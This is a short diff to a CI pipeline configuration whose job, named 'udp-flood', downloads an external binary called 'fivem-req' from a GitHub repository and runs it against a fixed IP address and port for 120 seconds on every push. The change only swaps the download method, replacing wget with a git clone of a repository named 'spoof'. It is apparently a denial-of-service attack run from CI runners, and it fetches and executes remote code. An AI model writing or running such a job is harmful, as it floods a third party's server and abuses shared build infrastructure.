@@ -13,10 +13,10 @@ udp-flood:
         -v $(pwd):/app \
         ubuntu:22.04 \
         sh -c "
-          apt-get update && apt-get install -y wget &&
-          wget -O /app/fivem-req 'https://github.com/onari65/Titan/raw/main/om' &&
-          chmod +x /app/fivem-req &&
-          /app/fivem-req 162.245.204.228 80 120
+          apt-get update && apt-get install -y git &&
+          git clone https://github.com/Titanop242424/spoof.git /app/spoof &&
+          chmod +x /app/spoof/fivem-req &&
+          /app/spoof/fivem-req 162.245.204.228 80 120
         "
   rules:
     - if: $CI_PIPELINE_SOURCE == "push"
